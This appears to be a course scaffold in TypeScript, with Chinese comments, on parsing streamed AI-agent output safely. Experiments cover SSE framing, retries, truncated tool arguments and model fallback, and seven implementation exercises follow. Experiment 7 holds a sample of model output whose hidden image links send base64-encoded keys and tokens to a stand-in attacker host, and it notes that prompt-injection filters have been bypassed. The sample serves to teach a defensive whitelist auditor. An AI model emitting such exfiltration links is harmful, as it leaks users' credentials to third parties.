/**
 * L16 的脚手架。跑法：pnpm wire
 *
 * 分两半：
 *   上半是**观察实验**，直接跑参考实现，让你先看见现象。不用写代码。
 *   下半是七个 TODO，你来实现。写完跑 pnpm verify:l16。
 *
 * 观察实验为什么放前面：这一节的坑分两类，而**两类都看不见**。
 *   一类是静默错误：CDN 把帧切开、流中途换模型、max_tokens 截断参数——
 *     HTTP 200，日志全绿，只是内容不对。
 *   一类是反向优化：打字机效果。它不是"没效果"，是**有负效果**，
 *     而它看起来恰恰像是在改善体验。
 *
 * ★ 全程一次模型都不调。这一节尤其不该调——它要测的全是结构性的东西：
 *   · 分帧 = 规范给的封闭规则集 → 纯函数
 *   · 撤回 = 协议定义的状态机 → 纯 reducer
 *   · 参数累积 = 官方三步契约 → 字符串拼接 + parse
 *   · 并行归位 = 按显式字段分组 → 纯 reducer
 * 真去调模型会让这些结论不可复现，而且一次都测不到 fallback 这种罕见分支。
 */

import {
  type Chunk,
  JsonAccumulator,
  Relay,
  SseParser,
  type View,
  applyAll,
  applyChunk,
  auditLinks,
  emptyView,
  findFrameEnd,
  parseAll,
  reassemble,
  visibleText,
} from '../shared/wire.ts'

const dim = (s: string) => `\x1b[2m${s}\x1b[0m`
const bold = (s: string) => `\x1b[1m${s}\x1b[0m`
const red = (s: string) => `\x1b[31m${s}\x1b[0m`
const green = (s: string) => `\x1b[32m${s}\x1b[0m`
const yellow = (s: string) => `\x1b[33m${s}\x1b[0m`
const w = (s: string) =>
  [...s].reduce((n, c) => n + (/[\u2e80-\u9fff\uff00-\uffef]/.test(c) ? 2 : 1), 0)
const pad = (s: string, n: number) => s + ' '.repeat(Math.max(0, n - w(s)))
const rpad = (s: string, n: number) => ' '.repeat(Math.max(0, n - w(s))) + s

// ═════════════════════════════════════════════════════════════
// 上半：观察实验
// ═════════════════════════════════════════════════════════════

/** 一条确定性的假流。所有实验共用，所以每次跑结果都一样。 */
function fixture(sep = '\n\n'): string {
  return (
    `event: message_start${sep.slice(0, sep.length / 2) || '\n'}` +
    `data: {"type":"message_start"}${sep}` +
    `data: {"type":"text","delta":"先读一下配置文件。"}${sep}` +
    `data: {"type":"tool_use","name":"read","input":"{\\"path\\":\\"cfg.ts\\"}"}${sep}` +
    `data: {"type":"text","delta":"看起来端口写死了。"}${sep}` +
    `data: {"type":"message_stop"}${sep}`
  )
}

/**
 * 实验一：一个只找 `\n\n` 的转发器，在混用行结束符的流上会怎样。
 *
 * ★ 这是 L02 欠条二（「转发不是搬运」）里最便宜的一个错。
 *
 * 规范允许三种行结束符（CRLF / LF / CR）任意混用，所以「空行」有**八种**
 * 可分辨的字节组合。而 `indexOf('\n\n')` 只认其中一种。
 *
 * 注意它的失败方式：不是抛异常，是**一路攒到流结束才吐**。
 * 也就是你的流式接口"能用"，只是一点都不流——而这件事在本地测不出来，
 * 因为本地的服务端和浏览器之间没有那个会改写行结束符的中间层。
 */
function exp1(): void {
  console.log(bold('\n实验一：只认 \\n\\n 的转发器，遇到混用行结束符'))
  console.log(dim('  同一条流，八种「空行」写法，看转发器能切出几帧。\n'))

  // 故意写错的版本：只找一种分隔符
  const naiveFrames = (src: string): number => {
    let buf = src
    let n = 0
    for (;;) {
      const i = buf.indexOf('\n\n')
      if (i === -1) break
      n++
      buf = buf.slice(i + 2)
    }
    return n
  }

  const combos: [string, string][] = [
    ['CRLF+CRLF', '\r\n\r\n'],
    ['CRLF+LF', '\r\n\n'],
    ['CRLF+CR', '\r\n\r'],
    ['LF+CRLF', '\n\r\n'],
    ['LF+LF', '\n\n'],
    ['LF+CR', '\n\r'],
    ['CR+CRLF', '\r\r\n'],
    ['CR+CR', '\r\r'],
  ]

  console.log(
    dim('  ' + pad('空行写法', 14) + rpad('只认 \\n\\n', 12) + rpad('按行切', 10) + '  结论'),
  )
  for (const [name, sep] of combos) {
    const src = fixture(sep)
    const naive = naiveFrames(src)
    const correct = (() => {
      const r = new Relay()
      return r.push(src).emit.length
    })()
    const same = naive === correct
    console.log(
      '  ' +
        pad(name, 14) +
        (same ? rpad(String(naive), 12) : red(rpad(String(naive), 12))) +
        green(rpad(String(correct), 10)) +
        '  ' +
        (same ? dim('一致') : red(`漏了 ${correct - naive} 帧`)),
    )
  }
  console.log(
    dim(
      '\n  ★ 八种里只有两种是对的，而且第二种（CRLF+LF）是**碰巧**——\n' +
        '    `\\r\\n\\n` 的尾部恰好含有一个 `\\n\\n`，位置也刚好对。\n' +
        '    这种"碰巧对"比全错更危险：它让你在本地测通之后以为实现没问题。\n' +
        '\n' +
        '    其余六种全部漏成 0 帧。漏成 0 帧的意思是：\n' +
        '    转发器手上攒着整条流，直到结束才一次吐出去。\n' +
        '    用户看到的是转圈十秒、然后整段文字瞬间出现——而你的日志里\n' +
        '    这是一次成功的流式响应。\n' +
        '\n' +
        '    WHATWG 规范自己就警告过这件事：\n' +
        '    "HTTP chunking can have unexpected negative effects on the\n' +
        '     reliability of this protocol"',
    ),
  )
}

/**
 * 实验二：CDN 把帧切开，下游会怎么死。
 *
 * ★★ 这一条是 L02 欠条二的**一手证据**，不是我编的场景：
 * Anthropic 官方 TypeScript SDK 有一个修复，标题就是
 * "skip SSE events with empty data to prevent JSON parse crash"，
 * 原因是边缘环境的代理和 CDN 会把 SSE chunk 切开。
 *
 * 下面对比两种下游：
 *   naive：对每一块直接 JSON.parse（很多人第一版就这么写）
 *   有状态：一个跨块保留残留的解析器
 */
function exp2(): void {
  console.log(bold('\n实验二：把流在每个字节位置切开，下游活不活'))
  const src = fixture()

  // naive 下游：每块自己 parse
  const naiveRead = (chunks: string[]): { events: number; crash: string | null } => {
    let events = 0
    for (const c of chunks) {
      for (const line of c.split('\n')) {
        if (!line.startsWith('data:')) continue
        try {
          JSON.parse(line.slice(5).trim())
          events++
        } catch (e) {
          return { events, crash: (e as Error).message.slice(0, 40) }
        }
      }
    }
    return { events, crash: null }
  }

  let naiveCrashes = 0
  let naiveWrong = 0
  let statefulWrong = 0
  const want = parseAll([src]).length

  for (let cut = 1; cut < src.length; cut++) {
    const chunks = [src.slice(0, cut), src.slice(cut)]
    const n = naiveRead(chunks)
    if (n.crash) naiveCrashes++
    else if (n.events !== want) naiveWrong++
    if (parseAll(chunks).length !== want) statefulWrong++
  }

  const total = src.length - 1
  console.log(dim(`  这条流有 ${src.length} 字节、${want} 个事件。在每个位置切成两块试一遍。\n`))
  console.log(
    '  ' +
      pad('每块直接 parse', 18) +
      red(`崩 ${naiveCrashes} 次`) +
      dim(' / ') +
      yellow(`静默少事件 ${naiveWrong} 次`) +
      dim(` / 共 ${total} 个切点`),
  )
  console.log(
    '  ' + pad('有状态解析器', 18) + green(`全部 ${total} 个切点都正确`) + dim('（0 崩溃、0 丢失）'),
  )
  console.log(
    dim(
      '\n  ★ 注意「静默少事件」那一栏比崩溃更可怕：崩溃你会看见，\n' +
        '    少一个事件只是这次回答短了一句，而你以为模型就是这么答的。\n' +
        '\n' +
        '    而且这不是理论风险。Anthropic 官方 SDK 修过这个 bug，\n' +
        '    commit 标题是 "skip SSE events with empty data to prevent JSON\n' +
        '    parse crash"，起因正是 CDN 重新分帧。\n' +
        '\n' +
        '    这就是为什么你的**服务端**转发这个流时要重新实现分帧：\n' +
        '    上游给你的块边界和帧边界没有任何关系。',
    ),
  )
}

/**
 * 实验三：一个只会 append 的前端，在流中途失败重试时会渲染出什么。
 *
 * ★★ 这是 L02 欠条一，也是这一节的中心论点。
 *
 * 场景：模型写了半句，那一步失败了，服务端重试。因为 HTTP 头早就发出去了,
 * 服务端只能在流**内部**表达这件事——而这时半句话已经在屏幕上。
 */
function exp3(): void {
  console.log(bold('\n实验三：流中途失败重试，屏幕上剩下什么'))

  const stream: Chunk[] = [
    { type: 'start-step' },
    { type: 'text-delta', id: 't1', delta: '我去读一下 config.ts，' },
    { type: 'text-delta', id: 't1', delta: '端口应该写在第 4' },
    // ↑ 这一步在这里失败了。服务端重试，并先发一个 reset-step。
    { type: 'reset-step' },
    { type: 'text-delta', id: 't2', delta: '我去读一下 config.ts，' },
    { type: 'text-delta', id: 't2', delta: '端口写在第 42 行，是硬编码的。' },
    { type: 'finish-step' },
  ]

  // 只会 append 的前端：把 reset-step 当成未知类型忽略掉
  const appendOnly = stream
    .filter((c) => c.type === 'text-delta')
    .map((c) => (c as { delta: string }).delta)
    .join('')

  const correct = visibleText(applyAll(stream))

  console.log(dim('\n  只会 append 的前端渲染出：'))
  console.log('    ' + red(appendOnly))
  console.log(dim('\n  正确处理 reset-step 的前端渲染出：'))
  console.log('    ' + green(correct))
  console.log(
    dim(
      `\n  ★ 前者多出了 ${appendOnly.length - correct.length} 个字符，而且是**重复了半句话**——\n` +
        '    用户看到的是「我去读一下 config.ts，端口应该写在第 4我去读一下……」。\n' +
        '\n' +
        '    这不是本课程编的设计。Vercel AI SDK 的线协议里就有这个 chunk，\n' +
        '    官方源码注释是 "Removes all message parts added during the current step."，\n' +
        '    用途写的正是「某一步重试了，失败那次的部分输出必须在替换输出\n' +
        '    到达之前失效」。\n' +
        '\n' +
        '    所以 agent 前端的核心数据结构不是消息列表，是一个**带撤销点的\n' +
        '    回滚缓冲区**。而这一点是普通 Web 应用里完全没有对应物的：\n' +
        '    `state → view` 是纯函数，它从来不需要「撤回」。',
    ),
  )
}

/**
 * 实验四：max_tokens 在参数中间截断，而这条路上没有任何错误信号。
 *
 * ★★ 这是 reset-step 之外**第二条**通往撤回的路径，而它更容易漏：
 * 流是正常结束的，HTTP 200，没有 error 事件，stop_reason 甚至不是个"错误"。
 */
function exp4(): void {
  console.log(bold('\n实验四：HTTP 200、无错误事件，但参数只有一半'))

  const half = '{"path":"src/config.ts","replace":"PORT=80'
  const acc = new JsonAccumulator()
  acc.push(half)

  console.log(dim('\n  收到的参数字符串：'))
  console.log('    ' + yellow(half))

  // 三种下游的反应
  const guessed = half + '"}' // 「补全」派
  const stateTrunc = (() => {
    const a = new JsonAccumulator()
    a.push(half)
    a.truncate()
    return a.get()
  })()

  console.log(dim('\n  三种处理方式：\n'))
  console.log(
    '  ' +
      pad('当成非法 JSON 修补', 20) +
      red(guessed) +
      dim('\n' + ' '.repeat(22) + '↑ 语法合法了，但 PORT=80 是模型想写的值吗？'),
  )
  console.log(
    '  ' + pad('当成普通 invalid', 20) + yellow('走 INVALID_JSON 回传给模型') + dim('  偏保守，但浪费一轮'),
  )
  console.log(
    '  ' +
      pad('识别 truncated', 20) +
      green(`state=${stateTrunc.state}，不可执行`) +
      dim('  撤回 + 提高 max_tokens 重试'),
  )

  const v = applyAll([
    { type: 'start-step' },
    { type: 'text-delta', id: 't', delta: '我来改一下端口。' },
    { type: 'tool-input-start', id: 'x', toolName: 'edit' },
    { type: 'tool-input-delta', id: 'x', delta: half },
    { type: 'stop-reason', reason: 'max_tokens' },
  ])
  console.log(
    dim(
      `\n  ★ 状态机的处理：撤回了 ${v.retracted} 个 part，正文保留「${visibleText(v)}」。\n` +
        '\n' +
        '    官方对这条路径有明文规定，而且方向很明确：\n' +
        '    "Check the stop reason and decide whether to retry the request with a\n' +
        '     higher max_tokens or repair the partial input."\n' +
        '    以及："you\'ll need to retry the request with a higher max_tokens value\n' +
        '     to get the full tool use"\n' +
        '\n' +
        '    所以参数状态是**四态**而不是两态：streaming / ready / invalid / truncated。\n' +
        '    一个只有「合法/非法」的实现会把 truncated 归到非法，于是走上修补的路——\n' +
        '    而修补一个被截断的参数，等于替模型猜它想干什么。',
    ),
  )
}

/**
 * 实验五：打字机效果的代价。
 *
 * ★★ 这个实验是这一节最该亲手跑一遍的，因为它的结论和直觉相反，
 * 而且**两个方向同时相反**。
 *
 * 通行的说法是「打字机效果让等待变得可以忍受」。但：
 *
 *   代价一（纯算术，下面这张表）：内容已经到手了，打字机还让用户接着等。
 *   代价二（有一手实验依据）：Tombaugh 1985 发现理解率在 30 cps 和「瞬间全显」
 *     时最高，**15 cps 最差**。也就是慢速逐字显示不只是慢，是**更难读**。
 *
 * 而收益那一侧：**查不到任何厂商的 A/B 数据表明流式输出改善满意度**，
 * 也查不到「最优打字机速度」的一手来源。
 *
 * 所以这一节对打字机的诚实结论是：代价可测，收益无据。
 */
function exp5(): void {
  console.log(bold('\n实验五：打字机效果让用户在内容到手之后继续等多久'))

  // 一个典型的 agent 回答：2000 字符，流在 8 秒内传完（TTFT 0.8s）
  const CHARS = 2000
  const STREAM_MS = 8000

  console.log(
    dim(`\n  一个 ${CHARS} 字符的回答，流在 ${STREAM_MS / 1000} 秒内全部到达客户端。\n`),
  )
  console.log(
    dim(
      '  ' +
        pad('渲染速率', 22) +
        rpad('显示完成', 12) +
        rpad('白等', 10) +
        rpad('DOM 更新次数', 14) +
        '  Tombaugh 1985',
    ),
  )

  const rows: [string, number | null, string][] = [
    ['15 cps（慢速打字机）', 15, '理解率**最差**的那一档'],
    ['30 cps', 30, '理解率最高的两档之一'],
    ['60 cps', 60, '快于阅读速度，无额外收益'],
    ['到多少显多少（不节流）', null, '等价于「瞬间全显」那一档'],
  ]

  for (const [label, cps, note] of rows) {
    const doneMs = cps === null ? STREAM_MS : Math.round((CHARS / cps) * 1000)
    const waste = Math.max(0, doneMs - STREAM_MS)
    // 不节流时按 60fps 合帧；打字机按每字符一次更新
    const updates = cps === null ? Math.round((STREAM_MS / 1000) * 60) : CHARS
    // ★ 先按宽度补齐，再上色——ANSI 码会把宽度算乱
    // ★ 取整用 Math.round，和 Python 侧的 round 对齐。用 toFixed 配 // 会差一秒。
    const wasteCell = rpad(waste === 0 ? '0s' : `+${Math.round(waste / 1000)}s`, 10)
    console.log(
      '  ' +
        pad(label, 22) +
        rpad(`${Math.round(doneMs / 1000)}s`, 12) +
        (waste === 0 ? green(wasteCell) : red(wasteCell)) +
        rpad(String(updates), 14) +
        '  ' +
        dim(note),
    )
  }

  console.log(
    dim(
      '\n  ★ 15 cps 那一行是最坏的组合：显示完成要 133 秒，比内容到手晚了 125 秒，\n' +
        '    DOM 更新 2000 次，而且它恰好落在 Tombaugh 实验里理解率最低的那一档。\n' +
        '\n' +
        '    Tombaugh 1985（ACM SIGCHI Bulletin，"The effect of VDU text-presentation\n' +
        '    rate on reading comprehension and reading speed"）的结论是理解率在\n' +
        '    **30 cps 和瞬间全显时最高，15 cps 最差**。\n' +
        '\n' +
        '    而 Anthropic 自己的建议是渲染前先缓冲几个 token，理由是避免过多的\n' +
        '    DOM 更新——注意这是为了**性能**，不是为了好看。',
    ) +
      '\n' +
      yellow('\n    收益那一侧必须如实说：') +
      dim(
        '查不到任何厂商的 A/B 数据表明流式输出\n' +
          '    改善满意度，也查不到「最优打字机速度」的一手来源。所以这一节\n' +
          '    不会告诉你该用多少 cps——它只告诉你慢速打字机的代价是可测的。',
      ),
  )
}

/**
 * 实验六：模型在流中途换了，而你的解析器可能把它当成一个空的工具调用。
 *
 * ★ 「一条流对应一个模型」这个假设是错的。
 */
function exp6(): void {
  console.log(bold('\n实验六：流中途换模型，靠什么看出来'))

  const events = [
    { seq: 1, itemId: 'a', outputIndex: 0, phase: 'start' as const, toolName: 'read', delta: '' },
    { seq: 2, itemId: 'a', outputIndex: 0, phase: 'delta' as const, delta: '{"path":"cfg.ts"}' },
    { seq: 3, itemId: 'a', outputIndex: 0, phase: 'stop' as const, delta: '' },
    // ↓ 只有 start 和 stop、一条 delta 都没有：这是一个模型边界
    { seq: 4, itemId: 'fb', outputIndex: 1, phase: 'start' as const, delta: '' },
    { seq: 5, itemId: 'fb', outputIndex: 1, phase: 'stop' as const, delta: '' },
    { seq: 6, itemId: 'b', outputIndex: 2, phase: 'start' as const, toolName: 'edit', delta: '' },
    { seq: 7, itemId: 'b', outputIndex: 2, phase: 'delta' as const, delta: '{"path":"cfg.ts"}' },
    { seq: 8, itemId: 'b', outputIndex: 2, phase: 'stop' as const, delta: '' },
  ]

  const r = reassemble(events)
  console.log(dim('\n  一条流里有三个块，其中一个是零 delta 的。\n'))
  console.log('  ' + pad('识别为工具调用', 18) + green(String(r.calls.length)) + dim(' 个（read、edit）'))
  console.log(
    '  ' +
      pad('识别为模型边界', 18) +
      green(JSON.stringify(r.modelBoundaries)) +
      dim('  ← 这一格不是工具调用'),
  )
  console.log(
    dim(
      '\n  ★ 一个假设「每个块至少有一个 delta」的解析器，会把它当成一个\n' +
        '    参数为空的工具调用——于是界面上多出一个名字是空串、参数是 {} 的卡片。\n' +
        '\n' +
        '    官方原文：\n' +
        '    "during server-side fallback responses, a fallback content block arrives\n' +
        '     at each model boundary as a content_block_start and content_block_stop\n' +
        '     pair with no deltas in between"\n' +
        '\n' +
        '    而这件事有 UI 后果，而不只是解析问题：**你可能需要在流中途告诉\n' +
        '    用户「下面这段是另一个模型写的」。** 普通 Web 应用里没有对应物。',
    ),
  )
}

/**
 * 实验七：渲染模型输出等于把不可信数据送进渲染层。
 *
 * ★★ 接 L14（prompt 注入）和 L15（外链本身就是外泄通道）。
 */
function exp7(): void {
  console.log(bold('\n实验七：一段"看起来什么都没显示"的 markdown'))

  const evil = [
    '好的，我已经读完了配置。',
    '',
    '![](https://attacker.test/p?d=QUtJQTEyMzQ1Njc4OTA)',
    '![载入中][ref]',
    '',
    '[ref]: https://attacker.test/q?d=c2stYW50LWFwaTAz',
    '<img src="//attacker.test/r?d=dG9rZW4">',
  ].join('\n')

  const audit = auditLinks(evil, ['cdn.trusted.test'])
  console.log(dim('\n  模型输出里夹了三个外链，界面上它们都不显示内容：\n'))
  for (const u of audit.offending) console.log('    ' + red(u))
  console.log(
    dim(
      `\n  ★ 三种形式都要抓：内联式 \`![](url)\`、参考式 \`![t][ref]\` + \`[ref]: url\`、\n` +
        '    以及内联 HTML。漏掉参考式的过滤器被真实绕过过。\n' +
        '\n' +
        '    关键在于**渲染即发送**——不需要用户点击。一个宽 0 高 0 的图片\n' +
        '    在界面上什么都不显示，但 query string 里的数据已经出去了。\n' +
        '    而它长得像一个正常的 UI 元素。\n' +
        '\n' +
        '    所以这里的判定必须是**白名单**：\n' +
        `    这段 markdown 里一共 ${audit.found.length} 个外部资源，${audit.offending.length} 个不在白名单内。\n` +
        '    L14 那张表里五个厂商的过滤全被绕过过，包括一个带 HMAC 签名的图片代理。',
    ),
  )
}

export function observe(): void {
  exp1()
  exp2()
  exp3()
  exp4()
  exp5()
  exp6()
  exp7()
}

// ═════════════════════════════════════════════════════════════
// 下半：你的实现
// ═════════════════════════════════════════════════════════════

/**
 * TODO 1：SSE 帧解析器。**这是本节最该自己写一遍的一个。**
 *
 * 实现一个增量解析器：`feed(chunk)` 返回这一块里已完整的事件，
 * 不完整的留在内部缓冲；`end()` 什么都不返回。
 *
 * 规范给的规则是**封闭的**，下面十条就是全部（每条 verify 里都有断言）：
 *
 *   a. 行结束符有三种：CRLF、LF、CR，可以在同一条流里混用。
 *   b. 流开头的一个 BOM 要剥掉，**只剥第一个字符位置上的那一个**。
 *   c. 以 `:` 开头的行是注释，整行忽略。它的正经用途是保活，
 *      规范正文里建议约 15 秒一次——所以必须**安静地**忽略，
 *      不能当成一个 data 为空的事件。
 *   d. `field: value`。冒号后**只忽略一个**空格：`data:  x` 的值是 `" x"`。
 *      没有冒号的整行是字段名，值为空串。
 *   e. 多个 `data` 行用 `\n` 连接，派发时去掉末尾那个 `\n`。
 *   f. `id` 含 U+0000 则整个字段忽略；**空的 `id:` 是合法的**，
 *      它把 last event ID 重置成空串。
 *   g. `retry` 只接受纯 ASCII 数字，否则**静默失效**（`retry: 3000ms` 不报错）。
 *   h. 未知字段忽略。这是前向兼容机制，不是可以省掉的分支。
 *   i. 空行派发。★ 顺序：last event ID 的更新**发生在**「data 是否为空」
 *      的判断之前——一个只有 `id:` 的事件不派发，但它确实改了 last event ID。
 *   j. ★ 流末尾没有以空行收尾的事件要**直接丢弃**。
 *
 * ★ 两个陷阱：
 *   · 默认事件类型是 `"message"`，不是空串。
 *   · 不要每取一行就 `buf = buf.slice(...)`——那是二次方的，
 *     症状是「越到后面越卡」，很容易被错怪到渲染上。用偏移量。
 */
export class MySseParser {
  feed(_chunk: string): { type: string; data: string; lastEventId: string }[] {
    throw new Error('TODO 1 未实现')
  }
  end(): void {
    throw new Error('TODO 1 未实现')
  }
  get reconnectionTimeMs(): number | null {
    throw new Error('TODO 1 未实现')
  }
}

/**
 * TODO 2：找出第一个帧结束位置（含结束符），没有完整帧返回 null。
 *
 * ★ 不要用 `indexOf('\n\n')`。实验一已经让你看见后果了：
 * 「空行」= 两个连续的行结束符，而行结束符有三种，所以它有**八种**
 * 可分辨的字节组合：
 *
 *     \r\n\r\n   \r\n\n   \r\n\r   \n\r\n   \n\n   \n\r   \r\r\n   \r\r
 *
 * （CR 后面跟 LF 那一种不算，因为它就是一个 CRLF，不是两个结束符。）
 *
 * 正确做法是**按行切**：逐个吃掉行结束符，遇到空行就是帧尾。
 *
 * ★ 有一处一字节的含糊要想清楚再动手：如果缓冲正好在 `\r` 处结束，
 * 你无法知道下一块是不是以 `\n` 开头。想一想在 `\r` 处切开安不安全，
 * 以及为什么——提示：切点只影响字节**什么时候**被冲出去。
 */
export function myFindFrameEnd(_s: string): number | null {
  throw new Error('TODO 2 未实现')
}

/**
 * TODO 3：渲染缓冲区的 reducer。**这是这一节的中心论点所在。**
 *
 * `applyChunk(view, chunk) → view`，纯函数。
 *
 * 必须满足的性质（每一条对应一个协议事实）：
 *
 *   a. `reset-step` 删掉**当前 step** 里加入的全部 part（含工具槽位）。
 *      官方定义："Removes all message parts added during the current step."
 *      ★ 不要连更早的 step 一起删——那些是已经成功的内容。
 *
 *   b. ★ 如果**没有** step 边界，`reset-step` 删掉当前消息的全部 part。
 *      这条是「无边界」的边界情况，最容易写漏。
 *
 *   c. `finish-step` 结束的是**一个 step**，不是整条消息。它不改 status。
 *
 *   d. `abort` / `error` 之后是**终态**：后到的内容 chunk 要丢掉。
 *      ★ 这条不是洁癖——用户点停止之后管线里还有在路上的 delta，
 *      一个继续 append 的实现会在用户按下停止之后**还往屏幕上写字**。
 *
 *   e. `stop-reason` 是 `max_tokens` 时，把参数还没收完的工具调用**撤回**，
 *      并计入 retracted。这是 reset-step 之外第二条通往撤回的路径，
 *      而它更容易漏：流正常结束、HTTP 200、没有错误事件。
 *
 *   f. ★★ **未知的 chunk 类型要静默忽略，不能抛错。**
 *      「严格校验」在普通前端里是美德，在流式协议里是 bug：
 *      AI SDK 的 chunk schema 每个 variant 都用宽松对象（容忍未知字段），
 *      Anthropic 把「优雅处理未知事件类型」写成了明文规定。
 *      现实后果：OpenAI 加了个 `obfuscation` 字段之后，
 *      做严格校验的客户端直接挂了。
 *
 *   g. `text-delta` 带一个没见过的 id 时**创建新 part**，不要追加到旧的。
 *
 *   h. 连续两次 `reset-step` 幂等，不抛异常。
 */
export function myApplyChunk(_v: View, _c: Chunk | { type: string }): View {
  throw new Error('TODO 3 未实现')
}

/**
 * TODO 4：流式工具参数的累积器。
 *
 * 官方的累积契约就三步：
 *   1. `content_block_start` 时初始化空字符串
 *   2. 每个 `input_json_delta` 追加 `partial_json`
 *   3. `content_block_stop` 时 parse
 *
 * ★★ 但真正要想清楚的是**四个状态**，以及「能展示」和「能执行」的区别：
 *
 *   streaming  还没收到 stop。snapshot 可以展示，但不可执行。
 *   ready      收完且合法。可执行。
 *   invalid    收完但**不合法**。官方原话是 the accumulated string might not
 *              be valid JSON——不是「中途不合法」，是最后也可能不合法。
 *   truncated  被 max_tokens 切断。★ 和 invalid 的处理**相反**：
 *              这个要重试，不要修补。
 *
 * ★ 两个容易合并错的地方：
 *   · `snapshot` 和 `canExecute` 不是一件事。官方 SDK 在每个 delta 上都吐
 *     snapshot 给你展示；但执行的唯一安全点是 stop。
 *     结论不是「不许展示半截参数」，而是**审批必须卡在 canExecute 上**。
 *   · 零 delta（start 后直接 stop）是**合法**的，结果是 `{}` 而不是解析错误。
 *     为什么会有这种块，见 TODO 5。
 *
 * ★ 还有一条官方明文交代的实现细节：非法参数要包成
 *   `{"INVALID_JSON": "<原始字符串>"}` 回传给模型，而且**用 JSON 库构造，
 *   不要拼字符串**——非法参数里几乎一定有引号，拼字符串会让包装本身也变成
 *   非法 JSON，于是你把一个解析错误变成了两个。
 */
export class MyJsonAccumulator {
  push(_delta: string): void {
    throw new Error('TODO 4 未实现')
  }
  close(): void {
    throw new Error('TODO 4 未实现')
  }
  truncate(): void {
    throw new Error('TODO 4 未实现')
  }
  get(): unknown {
    throw new Error('TODO 4 未实现')
  }
}

/**
 * TODO 5：并行工具调用的事件归位。
 *
 * ★ 并行工具调用的事件**会交错**：A 的 delta、B 的 delta、A 的 delta……
 * 归位靠 itemId / outputIndex，排序靠全局 seq（乱序到达是真实存在的）。
 *
 * 要求：
 *   a. 输出按 outputIndex 排序，和到达顺序无关。
 *   b. 同一个 itemId 收到两次 start 是协议违规，抛错而不是覆盖。
 *   c. delta / stop 找不到对应的 start 时抛错，**不要静默新建**。
 *   d. ★★ **零 delta 的块不是工具调用，是模型边界。**
 *      Anthropic 的流可以在服务端中途换模型，每个边界会插一个只有
 *      start 和 stop 的空块。把它们单独收集出来。
 *
 * ★ 这个 TODO 最重要的一点：一个按到达顺序往「当前工具」上追加的实现，
 * 会把 B 的参数拼到 A 上。而这个 bug 在**只有一个工具调用时完全不可见**——
 * 它的表现是两个工具都拿到语法合法但内容串味的参数，不抛异常、日志全绿，
 * 只是 agent 去读了一个它没打算读的文件。
 */
export function myReassemble(_events: unknown[]): unknown {
  throw new Error('TODO 5 未实现')
}

/**
 * TODO 6：中断之后，怎么构造下一轮请求。
 *
 * ★★ 这个 TODO 的职责是**拦住**一个很自然的想法，而不是实现它。
 * 所以它的 verify 里有几条是「断言你**没有**做某件事」。
 *
 * 2026 年的反转，方向和经典做法完全相反：
 *
 *   a. ★ 「把半截 assistant 消息放回去让模型接着写」（prefill / 续写）
 *      在 Claude 4.6 及以后**直接返回 400**，不是降级，是报错。
 *      恢复中断的流要改用一条 **user** 消息来表达。
 *      所以：**下一轮请求体的末尾不能是 assistant 消息。**
 *
 *   b. thinking 块必须**逐字节原样**回传，包括 signature。改一个字就是 400。
 *      ★ 而 400 最常见的起因是一个前端标准操作：`messages.map(...)` 里
 *      按 type 过滤，把 thinking 块顺手滤掉了。
 *
 *   c. tool_use 块和 thinking 块**不能部分恢复**。只能从最后一个**完整的**
 *      text 块处接续。
 *
 *   d. ★ 客户端做上下文压缩会打掉 thinking 块（某些模型上有前缀绑定校验）。
 *      这条直接咬 L06——你在那一节写的压缩逻辑，在这里会变成 400。
 *
 * 返回一个判定：能不能接续、为什么、最多能带到哪个 part。
 */
export function myCheckResumable(_v: View): unknown {
  throw new Error('TODO 6 未实现')
}

/**
 * TODO 7：扫出一段 markdown 里会**自动发起网络请求**的外链。
 *
 * ★★ 这是本节唯一一处真正的安全边界，接 L14 和 L15。
 *
 * 要求：
 *   a. 三种形式都要抓：内联式 `![](url)`、参考式 `![t][ref]` + `[ref]: url`、
 *      内联 HTML 的 `<img src=...>`。★ 漏掉参考式的过滤器被真实绕过过。
 *   b. 判定用**白名单**，不是黑名单。
 *   c. ★★ `//host/path` 这种**协议相对 URL** 要算违规。
 *      这一条必须排在「以 / 开头就是站内路径」的判断**之前**——
 *      这是整个函数里唯一一处顺序写错就变成安全漏洞的地方。
 *   d. 解析不出来的 URL 算**违规**。「看不懂所以放过」是这门课反复出现的那个错。
 *
 * ★ 为什么是白名单：关键在于**渲染即发送**，不需要用户点击。
 * 一个宽 0 高 0 的图片在界面上什么都不显示，但 query string 里的数据
 * 已经出去了——而它长得像一个正常的 UI 元素。
 */
export function myAuditLinks(
  _markdown: string,
  _allowedHosts: string[],
): { found: string[]; offending: string[] } {
  throw new Error('TODO 7 未实现')
}

// ─────────────────────────────────────────────────────────────

if (process.argv[1]?.endsWith('wire.ts')) {
  observe()
  console.log(
    dim('\n  下一步：实现文件下半部分的七个 TODO，然后跑 pnpm verify:l16。\n') +
      dim('  想先确认测试本身是对的，跑 WIRE_IMPL=shared pnpm verify:l16。\n') +
      dim('  交付物那个界面在 labs/l16/ui/，跑 pnpm ui。\n'),
  )
}

// 让 verify 能拿到这些，避免它重复声明
export { SseParser, Relay, JsonAccumulator, applyChunk, findFrameEnd, parseAll, emptyView }
